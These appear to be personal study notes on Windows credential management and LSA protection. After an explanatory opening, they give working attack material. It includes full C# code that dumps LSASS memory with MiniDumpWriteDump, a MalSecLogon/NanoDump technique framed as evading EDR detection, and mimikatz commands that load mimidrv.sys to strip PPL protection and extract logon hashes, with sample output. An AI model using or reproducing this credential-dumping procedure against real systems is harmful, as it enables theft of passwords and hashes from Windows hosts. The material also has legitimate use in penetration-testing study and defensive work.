**credential process in Windows authentication:**

- windows credential management: the process where an OS receives the credentials from a service or a user, and secures it to the authenticating target for future presentation.
    
    - in the case of a domain-joined computer, the authenticating target is the domain controller.
- the credentials used are digital documents that identify the user wether a certificate, password, or PIN.
    
    - windows credentials are authenticated against the SAM database on the local computer, or Active Directory through the Winlogon service
- credentials are collected through user input on the logonUI or programmatically via the application programming interface (API) to be presented to the authenticating target.
    
- local security info is stored under **HKEY_LOCAL_MACHINE\SECURITY**.
    
    - information like policy settings, default security values, and account information, such as cached logon credentials.
    - A copy of the SAM database is also stored here, although it is write-protected.
- The following diagram shows the components that are required and the paths that credentials take through the system to authenticate the user or process for a successful logon.
    
    ![authn_lsa_architecture_client.gif](https://prod-files-secure.s3.us-west-2.amazonaws.com/a262cebd-48cd-423a-b717-ca87d807038f/0b987309-614a-4d3b-9232-bf07fe9e3f9f/authn_lsa_architecture_client.gif)
    

**********LSA**********

- the LSA includes the LSASS process, which validates users for local and remote sign-ins and enforces local security policies.
    
    - LSA is provided to prevent reading memory and code injection by nonprotected processes.
    - LSA protection runs in the background by isolating the LSA process in a container and preventing other processes like malicious actors or apps from accessing the feature.
- **********************limitations of enabling LSA protection:**********************
    
    - You can't attach a debugger to LSASS when it’s a protected process.
    - there is no supported way to debug a running protected process.
- evading LSA Protection:
    
    - Modern Anti-Virus and EDR solutions have the ability to monitor processes attempting to access LSASS memory.
        
        - because the anti-virus has the permission to access the LSASS memory
    - ************************************LSASS monitoring:************************************ using MiniDumpWriteDump from Dbghelp.dll can allow us to open the LSASS process and dump memory to disk. this can be demonstrated in the C# code:
        
        ```csharp
        using System;
        using System.Runtime.InteropServices;
        using System.Diagnostics;
        using System.IO;
         
        namespace DumpLSASS
        {
            class Program
            {
                [DllImport("Dbghelp.dll")]
                static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId,
                IntPtr hFile, int DumpType, IntPtr ExceptionParam,
                IntPtr UserStreamParam, IntPtr CallbackParam);
         
                [DllImport("kernel32.dll")]
                static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
         
         
                static void Main(string[] args)
                {
                    FileStream dumpFile = new FileStream("C:\\\\Windows\\\\tasks\\\\lsass.dmp", FileMode.Create);
                    Process[] lsass = Process.GetProcessesByName("lsass");
                    int lsass_pid = lsass[0].Id;
                    IntPtr handle = OpenProcess(0x001F0FFF, false, lsass_pid);
                    bool dumped = MiniDumpWriteDump(handle, lsass_pid, dumpFile.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
                    Console.WriteLine("Dumped lsass memory to C:\\\\Windows\\\\tasks\\\\lsass.dmp");
                }
            }
        }
        
        ```
        
- Bypassing LSASS Access Detection with MalSecLogon:
    
    - secondary logon (Seclogon): RPC service that allows processes to be started under alternate credentials.
        
    - The MalSecLogon attack abuses [CreateProcessWithLogonW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw) to leak an LSASS handle and dump the memory. This technique is implemented in [NanoDump](https://github.com/helpsystems/nanodump).
        
    - executing this code on a Windows system:
        
        ![malseclogon2.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/a262cebd-48cd-423a-b717-ca87d807038f/45da289b-4302-4672-a167-b41616d9f9bb/malseclogon2.png)
        
    - passwords can then be extracted from the dump file using [https://github.com/skelsec/pypykatz](https://github.com/skelsec/pypykatz)
        
- PPL (protect Process Light):
    
    - PPL provides additional LSA protection by setting privilege level on the process that can only read by a process of a higher privilege
        
    - to check if PPl is enabled by querying the RunAsPPL registry key:
        
        ```bash
        C:\\Windows\\system32>reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL
        ```
        
    - A DWORD of 0x1 means it is active:
        
        ```bash
        RunAsPPL REG_DWORD 0x1
        ```
        
    - after the registry key is set up a reboot will be required.
        
    - to bypass the PPL, we can get Mimiat to load mimidrv.sys, which is a digitally signed driver that removes the protection flags from the LSASS process:
        
        ```bash
        mimikatz # !+
        [*] 'mimidrv' service not present
        [+] 'mimidrv' service successfully registered
        [+] 'mimidrv' service ACL to everyone
        [+] 'mimidrv' service started
         
        mimikatz # !processprotect /process:lsass.exe /remove
        Process : lsass.exe
        PID 552 -> 00/00 [0-0-0]
         
        mimikatz # privilege::debug
        Privilege '20' OK
         
        mimikatz # sekurlsa::logonpasswords
         
        Authentication Id : 0 ; 41238 (00000000:0000a116)
        Session           : Interactive from 1
        User Name         : DWM-1
        Domain            : Window Manager
        Logon Server      : (null)
        Logon Time        : 30/03/2022 09:15:07
        SID               : S-1-5-90-0-1
                msv :
                 [00000003] Primary
                 * Username : DC$
                 * Domain   : BORDERGATE
                 * NTLM     :  .... *SNIP*
        ```